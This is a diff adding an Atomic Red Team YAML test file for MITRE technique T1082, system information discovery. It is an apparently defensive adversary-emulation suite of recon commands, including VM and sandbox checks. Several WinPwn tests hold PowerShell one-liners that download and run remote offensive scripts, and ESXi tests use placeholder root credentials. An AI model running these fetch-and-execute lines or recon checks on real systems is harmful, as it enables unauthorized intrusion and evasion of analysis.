@@ -1,0 +1,618 @@
+attack_technique: T1082
+display_name: System Information Discovery
+atomic_tests:
+- name: System Information Discovery
+  auto_generated_guid: 66703791-c902-4560-8770-42b8a91f7667
+  description: |
+    Identify System Info. Upon execution, system info and time info will be displayed.
+  supported_platforms:
+  - windows
+  executor:
+    command: |
+      systeminfo
+      reg query HKLM\SYSTEM\CurrentControlSet\Services\Disk\Enum
+    name: command_prompt
+- name: System Information Discovery
+  auto_generated_guid: edff98ec-0f73-4f63-9890-6b117092aff6
+  description: |
+    Identify System Info
+  supported_platforms:
+  - macos
+  executor:
+    command: |
+      system_profiler
+      ls -al /Applications
+    name: sh
+- name: List OS Information
+  auto_generated_guid: cccb070c-df86-4216-a5bc-9fb60c74e27c
+  description: |
+    Identify System Info
+  supported_platforms:
+  - linux
+  - macos
+  input_arguments:
+    output_file:
+      description: Output file used to store the results.
+      type: path
+      default: /tmp/T1082.txt
+  executor:
+    command: |
+      uname -a >> #{output_file}
+      if [ -f /etc/lsb-release ]; then cat /etc/lsb-release >> #{output_file}; fi
+      if [ -f /etc/redhat-release ]; then cat /etc/redhat-release >> #{output_file}; fi   
+      if [ -f /etc/issue ]; then cat /etc/issue >> #{output_file}; fi
+      if [ -f /etc/os-release ]; then cat /etc/os-release >> #{output_file}; fi
+      uptime >> #{output_file}
+      cat #{output_file} 2>/dev/null
+    cleanup_command: |
+      rm #{output_file} 2>/dev/null
+    name: sh
+- name: Linux VM Check via Hardware
+  auto_generated_guid: 31dad7ad-2286-4c02-ae92-274418c85fec
+  description: |
+    Identify virtual machine hardware. This technique is used by the Pupy RAT and other malware.
+  supported_platforms:
+  - linux
+  executor:
+    elevation_required: true
+    command: |
+      if [ -f /sys/class/dmi/id/bios_version ]; then cat /sys/class/dmi/id/bios_version | grep -i amazon; fi
+      if [ -f /sys/class/dmi/id/product_name ]; then cat /sys/class/dmi/id/product_name | grep -i "Droplet\|HVM\|VirtualBox\|VMware"; fi
+      if [ -f /sys/class/dmi/id/chassis_vendor ]; then cat /sys/class/dmi/id/chassis_vendor | grep -i "Xen\|Bochs\|QEMU"; fi
+      if [ -x "$(command -v dmidecode)" ]; then sudo dmidecode | grep -i "microsoft\|vmware\|virtualbox\|quemu\|domu"; fi
+      if [ -f /proc/scsi/scsi ]; then cat /proc/scsi/scsi | grep -i "vmware\|vbox"; fi
+      if [ -f /proc/ide/hd0/model ]; then cat /proc/ide/hd0/model | grep -i "vmware\|vbox\|qemu\|virtual"; fi
+      if [ -x "$(command -v lspci)" ]; then sudo lspci | grep -i "vmware\|virtualbox"; fi
+      if [ -x "$(command -v lscpu)" ]; then sudo lscpu | grep -i "Xen\|KVM\|Microsoft"; fi
+    name: bash
+- name: Linux VM Check via Kernel Modules
+  auto_generated_guid: 8057d484-0fae-49a4-8302-4812c4f1e64e
+  description: |
+    Identify virtual machine guest kernel modules. This technique is used by the Pupy RAT and other malware.
+  supported_platforms:
+  - linux
+  executor:
+    command: |
+      sudo lsmod | grep -i "vboxsf\|vboxguest"
+      sudo lsmod | grep -i "vmw_baloon\|vmxnet"
+      sudo lsmod | grep -i "xen-vbd\|xen-vnif"
+      sudo lsmod | grep -i "virtio_pci\|virtio_net"
+      sudo lsmod | grep -i "hv_vmbus\|hv_blkvsc\|hv_netvsc\|hv_utils\|hv_storvsc"
+    name: bash
+    elevation_required: true
+- name: FreeBSD VM Check via Kernel Modules
+  auto_generated_guid: eefe6a49-d88b-41d8-8fc2-b46822da90d3
+  description: |
+    Identify virtual machine host kernel modules.
+  supported_platforms:
+  - linux
+  executor:
+    command: |
+      kldstat | grep -i "vmm"
+      kldstat | grep -i "vbox"
+    name: sh
+- name: Hostname Discovery (Windows)
+  auto_generated_guid: 85cfbf23-4a1e-4342-8792-007e004b975f
+  description: |
+    Identify system hostname for Windows. Upon execution, the hostname of the device will be displayed.
+  supported_platforms:
+  - windows
+  executor:
+    command: |
+      hostname
+    name: command_prompt
+- name: Hostname Discovery
+  auto_generated_guid: 486e88ea-4f56-470f-9b57-3f4d73f39133
+  description: |
+    Identify system hostname for FreeBSD, Linux and macOS systems.
+  supported_platforms:
+  - linux
+  - macos
+  executor:
+    command: |
+      hostname
+    name: sh
+- name: Windows MachineGUID Discovery
+  auto_generated_guid: 224b4daf-db44-404e-b6b2-f4d1f0126ef8
+  description: |
+    Identify the Windows MachineGUID value for a system. Upon execution, the machine GUID will be displayed from registry.
+  supported_platforms:
+  - windows
+  executor:
+    command: |
+      REG QUERY HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Cryptography /v MachineGuid
+    name: command_prompt
+- name: Griffon Recon
+  auto_generated_guid: 69bd4abe-8759-49a6-8d21-0f15822d6370
+  description: |-
+    This script emulates the reconnaissance script seen in used by Griffon and was modified by security researcher Kirk Sayre 
+    in order simply print the recon results to the screen as opposed to exfiltrating them. [Script](https://gist.github.com/kirk-sayre-work/7cb5bf4e2c7c77fa5684ddc17053f1e5).  
+    For more information see also [https://malpedia.caad.fkie.fraunhofer.de/details/js.griffon](https://malpedia.caad.fkie.fraunhofer.de/details/js.griffon) and [https://attack.mitre.org/software/S0417/](https://attack.mitre.org/software/S0417/)
+  supported_platforms:
+  - windows
+  input_arguments:
+    vbscript:
+      description: Path to sample script
+      type: string
+      default: PathToAtomicsFolder\T1082\src\griffon_recon.vbs
+  dependency_executor_name: powershell
+  dependencies:
+  - description: |
+      Sample script file must exist on disk at specified location (#{vbscript})
+    prereq_command: |
+      if (Test-Path "#{vbscript}") {exit 0} else {exit 1}
+    get_prereq_command: |
+      New-Item -Type Directory (split-path "#{vbscript}") -ErrorAction ignore | Out-Null
+      Invoke-WebRequest "https://github.com/redcanaryco/atomic-red-team/raw/master/atomics/T1082/src/griffon_recon.vbs" -OutFile "#{vbscript}"
+  executor:
+    command: |
+      cscript "#{vbscript}"
+    name: powershell
+    elevation_required: false
+- name: Environment variables discovery on windows
+  auto_generated_guid: f400d1c0-1804-4ff8-b069-ef5ddd2adbf3
+  description: |
+    Identify all environment variables. Upon execution, environments variables and your path info will be displayed.
+  supported_platforms:
+  - windows
+  executor:
+    command: |
+      set
+    name: command_prompt
+- name: Environment variables discovery on freebsd, macos and linux
+  auto_generated_guid: fcbdd43f-f4ad-42d5-98f3-0218097e2720
+  description: |
+    Identify all environment variables. Upon execution, environments variables and your path info will be displayed.
+  supported_platforms:
+  - linux
+  - macos
+  executor:
+    command: |
+      env
+    name: sh
+- name: Show System Integrity Protection status (MacOS)
+  auto_generated_guid: 327cc050-9e99-4c8e-99b5-1d15f2fb6b96
+  description: |
+    Read and Display System Intergrety Protection status. csrutil is commonly used by malware and post-exploitation tools to determine whether certain files and directories on the system are writable or not.
+  supported_platforms:
+  - macos
+  executor:
+    command: |
+      csrutil status
+    name: sh
+- name: WinPwn - winPEAS
+  auto_generated_guid: eea1d918-825e-47dd-acc2-814d6c58c0e1
+  description: Discover Local Privilege Escalation possibilities using winPEAS function of WinPwn
+  supported_platforms:
+  - windows
+  executor:
+    command: |-
+      $S3cur3Th1sSh1t_repo = 'https://raw.githubusercontent.com/S3cur3Th1sSh1t'
+      iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/S3cur3Th1sSh1t/WinPwn/121dcee26a7aca368821563cbe92b2b5638c5773/WinPwn.ps1')
+      winPEAS -noninteractive -consoleoutput
+    name: powershell
+- name: WinPwn - itm4nprivesc
+  auto_generated_guid: 3d256a2f-5e57-4003-8eb6-64d91b1da7ce
+  description: Discover Local Privilege Escalation possibilities using itm4nprivesc function of WinPwn
+  supported_platforms:
+  - windows
+  executor:
+    command: |-
+      $S3cur3Th1sSh1t_repo = 'https://raw.githubusercontent.com/S3cur3Th1sSh1t'
+      iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/S3cur3Th1sSh1t/WinPwn/121dcee26a7aca368821563cbe92b2b5638c5773/WinPwn.ps1')
+      itm4nprivesc -noninteractive -consoleoutput
+    name: powershell
+- name: WinPwn - Powersploits privesc checks
+  auto_generated_guid: 345cb8e4-d2de-4011-a580-619cf5a9e2d7
+  description: Powersploits privesc checks using oldchecks function of WinPwn
+  supported_platforms:
+  - windows
+  executor:
+    command: |-
+      $S3cur3Th1sSh1t_repo = 'https://raw.githubusercontent.com/S3cur3Th1sSh1t'
+      iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/S3cur3Th1sSh1t/WinPwn/121dcee26a7aca368821563cbe92b2b5638c5773/WinPwn.ps1')
+      oldchecks -noninteractive -consoleoutput
+    cleanup_command: |-
+      rm -force -recurse .\DomainRecon -ErrorAction Ignore
+      rm -force -recurse .\Exploitation -ErrorAction Ignore
+      rm -force -recurse .\LocalPrivEsc -ErrorAction Ignore
+      rm -force -recurse .\LocalRecon -ErrorAction Ignore
+      rm -force -recurse .\Vulnerabilities -ErrorAction Ignore
+    name: powershell
+- name: WinPwn - General privesc checks
+  auto_generated_guid: 5b6f39a2-6ec7-4783-a5fd-2c54a55409ed
+  description: General privesc checks using the otherchecks function of WinPwn
+  supported_platforms:
+  - windows
+  executor:
+    command: |-
+      $S3cur3Th1sSh1t_repo = 'https://raw.githubusercontent.com/S3cur3Th1sSh1t'
+      iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/S3cur3Th1sSh1t/WinPwn/121dcee26a7aca368821563cbe92b2b5638c5773/WinPwn.ps1')
+      otherchecks -noninteractive -consoleoutput
+    name: powershell
+- name: WinPwn - GeneralRecon
+  auto_generated_guid: 7804659b-fdbf-4cf6-b06a-c03e758590e8
+  description: Collect general computer informations via GeneralRecon function of WinPwn
+  supported_platforms:
+  - windows
+  executor:
+    command: |-
+      $S3cur3Th1sSh1t_repo = 'https://raw.githubusercontent.com/S3cur3Th1sSh1t'
+      iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/S3cur3Th1sSh1t/WinPwn/121dcee26a7aca368821563cbe92b2b5638c5773/WinPwn.ps1')
+      Generalrecon -consoleoutput -noninteractive
+    name: powershell
+- name: WinPwn - Morerecon
+  auto_generated_guid: 3278b2f6-f733-4875-9ef4-bfed34244f0a
+  description: Gathers local system information using the Morerecon function of WinPwn
+  supported_platforms:
+  - windows
+  executor:
+    command: |-
+      $S3cur3Th1sSh1t_repo = 'https://raw.githubusercontent.com/S3cur3Th1sSh1t'
+      iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/S3cur3Th1sSh1t/WinPwn/121dcee26a7aca368821563cbe92b2b5638c5773/WinPwn.ps1')
+      Morerecon -noninteractive -consoleoutput
+    name: powershell
+- name: WinPwn - RBCD-Check
+  auto_generated_guid: dec6a0d8-bcaf-4c22-9d48-2aee59fb692b
+  description: Search for Resource-Based Constrained Delegation attack paths using RBCD-Check function of WinPwn
+  supported_platforms:
+  - windows
+  executor:
+    command: |-
+      $S3cur3Th1sSh1t_repo = 'https://raw.githubusercontent.com/S3cur3Th1sSh1t'
+      iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/S3cur3Th1sSh1t/WinPwn/121dcee26a7aca368821563cbe92b2b5638c5773/WinPwn.ps1')
+      RBCD-Check -consoleoutput -noninteractive
+    name: powershell
+
+- name: WinPwn - PowerSharpPack - Watson searching for missing windows patches
+  auto_generated_guid: 07b18a66-6304-47d2-bad0-ef421eb2e107
+  description: PowerSharpPack - Watson searching for missing windows patches  technique via function of WinPwn
+  supported_platforms:
+  - windows
+  executor:
+    command: |-
+      $S3cur3Th1sSh1t_repo = 'https://raw.githubusercontent.com/S3cur3Th1sSh1t'
+      iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/S3cur3Th1sSh1t/PowerSharpPack/master/PowerSharpBinaries/Invoke-SharpWatson.ps1')
+      Invoke-watson
+    name: powershell
+- name: WinPwn - PowerSharpPack - Sharpup checking common Privesc vectors
+  auto_generated_guid: efb79454-1101-4224-a4d0-30c9c8b29ffc
+  description: PowerSharpPack - Sharpup checking common Privesc vectors technique via function of WinPwn - Takes several minutes to complete.
+  supported_platforms:
+  - windows
+  executor:
+    command: |-
+      $S3cur3Th1sSh1t_repo = 'https://raw.githubusercontent.com/S3cur3Th1sSh1t'
+      iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/S3cur3Th1sSh1t/PowerSharpPack/master/PowerSharpBinaries/Invoke-SharpUp.ps1')
+      Invoke-SharpUp -command "audit"
+    name: powershell
+
+- name: WinPwn - PowerSharpPack - Seatbelt
+  auto_generated_guid: 5c16ceb4-ba3a-43d7-b848-a13c1f216d95
+  description: |-
+    PowerSharpPack - Seatbelt technique via function of WinPwn.
+
+    [Seatbelt](https://github.com/GhostPack/Seatbelt) is a C# project that performs a number of security oriented host-survey "safety checks" relevant from both offensive and defensive security perspectives.
+  supported_platforms:
+  - windows
+  executor:
+    command: |-
+      $S3cur3Th1sSh1t_repo = 'https://raw.githubusercontent.com/S3cur3Th1sSh1t'
+      iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/S3cur3Th1sSh1t/PowerSharpPack/master/PowerSharpBinaries/Invoke-Seatbelt.ps1')
+      Invoke-Seatbelt -Command "-group=all"
+    name: powershell
+- name: Azure Security Scan with SkyArk
+  auto_generated_guid: 26a18d3d-f8bc-486b-9a33-d6df5d78a594
+  description: |
+    Upon successful execution, this test will utilize a valid read-only Azure AD user's credentials to conduct a security scan and determine what users exist in a given tenant, as well as identify any admin users. 
+    Once the test is complete, a folder will be output to the temp directory that contains 3 csv files which provide info on the discovered users. 
+    See https://github.com/cyberark/SkyArk 
+  supported_platforms:
+  - azure-ad
+  input_arguments:
+    username:
+      description: Azure AD username
+      type: string
+      default:
+    password:
+      description: Azure AD password
+      type: string
+      default: T1082Az
+  dependency_executor_name: powershell
+  dependencies:
+  - description: |
+      The SkyArk AzureStealth module must exist in PathToAtomicsFolder\..\ExternalPayloads.
+    prereq_command: |
+      if (test-path "PathToAtomicsFolder\..\ExternalPayloads\AzureStealth.ps1"){exit 0} else {exit 1}
+    get_prereq_command: |
+      New-Item -Type Directory "PathToAtomicsFolder\..\ExternalPayloads\" -ErrorAction Ignore -Force | Out-Null
+      invoke-webrequest "https://raw.githubusercontent.com/cyberark/SkyArk/3293ee145e95061a8980dd7b5da0030edc4da5c0/AzureStealth/AzureStealth.ps1" -outfile "PathToAtomicsFolder\..\ExternalPayloads\AzureStealth.ps1"
+  - description: |
+      The AzureAD module must be installed.
+    prereq_command: |
+      try {if (Get-InstalledModule -Name AzureAD -ErrorAction SilentlyContinue) {exit 0} else {exit 1}} catch {exit 1}
+    get_prereq_command: |
+      Install-Module -Name AzureAD -Force
+  - description: |
+      The Az module must be installed.
+    prereq_command: |
+      try {if (Get-InstalledModule -Name Az -ErrorAction SilentlyContinue) {exit 0} else {exit 1}} catch {exit 1}
+    get_prereq_command: |
+      Install-Module -Name Az -Force
+  executor:
+    command: |
+      Import-Module "PathToAtomicsFolder\..\ExternalPayloads\AzureStealth.ps1" -force      
+      $Password = ConvertTo-SecureString -String "#{password}" -AsPlainText -Force
+      $Credential = New-Object -TypeName System.Management.Automation.PSCredential -ArgumentList "#{username}", $Password
+      Connect-AzAccount -Credential $Credential
+      Connect-AzureAD -Credential $Credential
+      Scan-AzureAdmins -UseCurrentCred
+    cleanup_command: |
+      $resultstime = Get-Date -Format "yyyyMMdd"
+      $resultsfolder = ("Results-" + $resultstime)
+      remove-item $env:temp\$resultsfolder -recurse -force -erroraction silentlycontinue
+    name: powershell
+    elevation_required: true
+- name: Linux List Kernel Modules
+  auto_generated_guid: 034fe21c-3186-49dd-8d5d-128b35f181c7
+  description: |
+    Enumerate kernel modules installed 3 different ways. Upon successful execution stdout will display kernel modules installed on host 2 times, followed by list of modules matching 'vmw' if present.
+  supported_platforms:
+  - linux
+  executor:
+    command: |
+      lsmod
+      kmod list
+      grep vmw /proc/modules
+    name: sh
+- name: FreeBSD List Kernel Modules
+  auto_generated_guid: 4947897f-643a-4b75-b3f5-bed6885749f6
+  description: |
+    Enumerate kernel modules loaded. Upon successful execution stdout will display kernel modules loaded, followed by list of modules matching 'vmm' if present.
+  supported_platforms:
+  - linux
+  executor:
+    command: |
+      kldstat
+      kldstat | grep vmm
+    name: sh
+
+- name: System Information Discovery with WMIC
+  auto_generated_guid: 8851b73a-3624-4bf7-8704-aa312411565c
+  description: |
+    Identify system information with the WMI command-line (WMIC) utility. Upon execution, various system information will be displayed, including: OS, CPU, GPU, and disk drive names; memory capacity; display resolution; and baseboard, BIOS, and GPU driver products/versions.
+    https://nwgat.ninja/getting-system-information-with-wmic-on-windows/
+    Elements of this test were observed in the wild used by Aurora Stealer in late 2022 and early 2023, as highlighted in public reporting:
+    https://blog.sekoia.io/aurora-a-rising-stealer-flying-under-the-radar
+    https://blog.cyble.com/2023/01/18/aurora-a-stealer-using-shapeshifting-tactics/
+  supported_platforms:
+  - windows
+  executor:
+    command: |
+      wmic cpu get name
+      wmic MEMPHYSICAL get MaxCapacity
+      wmic baseboard get product
+      wmic baseboard get version
+      wmic bios get SMBIOSBIOSVersion
+      wmic path win32_VideoController get name
+      wmic path win32_VideoController get DriverVersion
+      wmic path win32_VideoController get VideoModeDescription
+      wmic OS get Caption,OSArchitecture,Version
+      wmic DISKDRIVE get Caption
+      Get-WmiObject win32_bios
+    name: command_prompt
+
+- name: System Information Discovery
+  auto_generated_guid: 4060ee98-01ae-4c8e-8aad-af8300519cc7
+  description: |
+    The script gathernetworkinfo.vbs is employed to collect system information such as the operating system, DNS details, firewall configuration, etc. Outputs are stored in c:\Windows\System32\config or c:\Windows\System32\reg. https://www.verboon.info/2011/06/the-gathernetworkinfo-vbs-script/
+  supported_platforms:
+  - windows
+  executor:
+    command: |
+      wscript.exe C:\Windows\System32\gatherNetworkInfo.vbs
+    elevation_required: true
+    name: command_prompt
+- name: Check computer location
+  auto_generated_guid: 96be6002-9200-47db-94cb-c3e27de1cb36
+  description: |
+    Looks up country code configured in the registry, likely geofence. Upon execution, country code info will be displayed.
+    - https://tria.ge/210111-eaz8mqhgh6/behavioral1
+  supported_platforms:
+  - windows
+  executor:
+    command: |
+      reg query "HKEY_CURRENT_USER\Control Panel\International\Geo"
+    name: command_prompt
+- name: BIOS Information Discovery through Registry 
+  auto_generated_guid: f2f91612-d904-49d7-87c2-6c165d23bead
+  description: |
+    Looks up for BIOS information in the registry. BIOS information is often read in order to detect sandboxing environments.  Upon execution, BIOS information will be displayed.
+    - https://tria.ge/210111-eaz8mqhgh6/behavioral1
+    - https://evasions.checkpoint.com/techniques/registry.html
+  supported_platforms:
+  - windows
+  executor:
+    command: |
+      reg query HKEY_LOCAL_MACHINE\HARDWARE\DESCRIPTION\System /v SystemBiosVersion
+      reg query HKEY_LOCAL_MACHINE\HARDWARE\DESCRIPTION\System /v VideoBiosVersion
+    name: command_prompt
+- name: ESXi - VM Discovery using ESXCLI
+  auto_generated_guid: 2040405c-eea6-4c1c-aef3-c2acc430fac9
+  description: |
+    An adversary will using ESXCLI to enumerate the Virtual Machines on the host prior to executing power off routine.
+    [Reference](https://www.crowdstrike.com/blog/hypervisor-jackpotting-ecrime-actors-increase-targeting-of-esxi-servers/)
+  supported_platforms:
+  - windows
+  input_arguments:
+    vm_host:
+      description: Specify the host name or IP of the ESXi Server
+      type: string
+      default: atomic.local
+    vm_user:
+      description: Specify the privilege user account on ESXi Server
+      type: string
+      default: root
+    vm_pass:
+      description: Specify the privilege user password on ESXi Server
+      type: string
+      default: pass
+    plink_file:
+      description: Path to Plink
+      type: path
+      default: 'PathToAtomicsFolder\..\ExternalPayloads\plink.exe'
+    cli_script:
+      description: Path to file with discovery commands
+      type: path
+      default: PathToAtomicsFolder\T1082\src\esx_vmdiscovery.txt
+  dependency_executor_name: powershell
+  dependencies:
+  - description: |
+      Check if plink is available.
+    prereq_command: |
+      if (Test-Path "#{plink_file}") {exit 0} else {exit 1}
+    get_prereq_command: |
+      New-Item -Type Directory "PathToAtomicsFolder\..\ExternalPayloads\" -ErrorAction Ignore -Force | Out-Null
+      Invoke-WebRequest "https://the.earth.li/~sgtatham/putty/latest/w64/plink.exe" -OutFile "#{plink_file}"
+  executor:
+    command: |
+       echo "" | "#{plink_file}" "#{vm_host}" -ssh  -l "#{vm_user}" -pw "#{vm_pass}" -m "#{cli_script}"
+    name: command_prompt
+    elevation_required: false
+- name: ESXi - Darkside system information discovery
+  auto_generated_guid: f89812e5-67d1-4f49-86fa-cbc6609ea86a
+  description: |
+    Darkside ransomware utilises various ESXCLI commands to obtain information about the ESXi Host.
+    [Reference](https://www.trendmicro.com/en_ph/research/21/e/darkside-linux-vms-targeted.html)
+  supported_platforms:
+  - windows
+  input_arguments:
+    vm_host:
+      description: Specify the host name or IP of the ESXi Server
+      type: string
+      default: atomic.local
+    vm_user:
+      description: Specify the privilege user account on ESXi Server
+      type: string
+      default: root
+    vm_pass:
+      description: Specify the privilege user password on ESXi Server
+      type: string
+      default: pass
+    plink_file:
+      description: Path to Plink
+      type: path
+      default: 'PathToAtomicsFolder\..\ExternalPayloads\plink.exe'
+    cli_script:
+      description: Path to file containing darkside ransomware discovery commands
+      type: path
+      default: PathToAtomicsFolder\T1082\src\esx_darkside_discovery.txt
+  dependency_executor_name: powershell
+  dependencies:
+  - description: |
+      Check if plink is available.
+    prereq_command: |
+      if (Test-Path "#{plink_file}") {exit 0} else {exit 1}
+    get_prereq_command: |
+      New-Item -Type Directory "PathToAtomicsFolder\..\ExternalPayloads\" -ErrorAction Ignore -Force | Out-Null
+      Invoke-WebRequest "https://the.earth.li/~sgtatham/putty/latest/w64/plink.exe" -OutFile "#{plink_file}"
+  executor:
+    command: |
+       echo "" | "#{plink_file}" "#{vm_host}" -ssh  -l "#{vm_user}" -pw "#{vm_pass}" -m "#{cli_script}"
+    name: command_prompt
+    elevation_required: false
+- name: sysctl to gather macOS hardware info
+  auto_generated_guid: c8d40da9-31bd-47da-a497-11ea55d1ef6c
+  description: Gets the macOS hardware information, which can be used to determine whether the target macOS host is running on a physical or virtual machine. sysctl can be used to gather interesting macOS host data, including hardware information, memory size, logical cpu information, etc.
+  supported_platforms:
+  - macos
+  executor:
+    command: sysctl -n hw.model
+    name: sh
+    elevation_required: false
+- name: 'operating system discovery '
+  auto_generated_guid: 70e13ef4-5a74-47e4-9d16-760b41b0e2db
+  description: |-
+    operating system discovery using get-ciminstance
+    https://petri.com/getting-operating-system-information-powershell/
+  supported_platforms:
+  - windows
+  executor:
+    command: Get-CimInstance Win32_OperatingSystem | Select-Object Caption, Version, ServicePackMajorVersion, OSArchitecture, CSName, WindowsDirectory | Out-null
+    name: powershell
+    elevation_required: false
+- name: Check OS version via "ver" command
+  auto_generated_guid: f6ecb109-df24-4303-8d85-1987dbae6160
+  description: Ver command shows information about os version.
+  supported_platforms:
+  - windows
+  executor:
+    name: command_prompt
+    command: ver
+- name: Display volume shadow copies with "vssadmin"
+  auto_generated_guid: 7161b085-816a-491f-bab4-d68e974b7995
+  description: The command shows all available volume shadow copies, along with their creation time and location.
+  supported_platforms:
+  - windows
+  executor:
+    name: command_prompt
+    elevation_required: true
+    command: vssadmin.exe list shadows
+- name: Identify System Locale and Regional Settings with PowerShell
+  auto_generated_guid: ce479c1a-e8fa-42b2-812a-96b0f2f4d28a
+  description: |
+    This action demonstrates how an attacker might gather a system's region and language settings using PowerShell, which could aid in profiling 
+    the machine's location and user language preferences. The command outputs system locale details to a temporary file for further analysis.
+  supported_platforms:
+  - windows
+  executor:
+    name: command_prompt
+    command: |
+      powershell.exe -c "Get-Culture | Format-List | Out-File -FilePath %TMP%\a.txt"
+    cleanup_command: |
+      cmd.exe /c del "%TMP%\a.txt"
+    
+- name: Enumerate Available Drives via gdr
+  auto_generated_guid: c187c9bc-4511-40b3-aa10-487b2c70b6a5
+  description: |
+    This test simulates an attacker attempting to list the available drives on the system to gather data about file storage locations.
+  supported_platforms:
+  - windows
+  executor:
+    name: command_prompt
+    command: |
+      powershell.exe -c "gdr -PSProvider 'FileSystem'"
+- name: Discover OS Product Name via Registry
+  auto_generated_guid: be3b5fe3-a575-4fb8-83f6-ad4a68dd5ce7
+  description: |
+    Identify the Operating System Product Name via registry with the reg.exe command.
+    Upon execution, the OS Product Name will be displayed.
+  supported_platforms:
+    - windows
+  executor:
+    command: |
+      reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion" /v ProductName
+    name: command_prompt
+    elevation_required: false
+- name: Discover OS Build Number via Registry
+  auto_generated_guid: acfcd709-0013-4f1e-b9ee-bc1e7bafaaec
+  description: |
+    Identify the Operating System Build Number via registry with the reg.exe command.
+    Upon execution, the OS Build Number will be displayed.
+  supported_platforms:
+    - windows
+  executor:
+    command: |
+      reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion" /v CurrentBuildNumber
+    name: command_prompt
+    elevation_required: false
+- name: Get System Hardware UUID Via wmic.exe
+  auto_generated_guid: cd6fc00d-ad6e-431c-832c-33e97ab9218f
+  description: |
+    Upon execution, displays the system's hardware UUID. Used in BlackCat ransomware to generate a recovery URL.
+  supported_platforms:
+  - windows
+  executor:
+    command: |
+      wmic csproduct get UUID
+    name: powershell
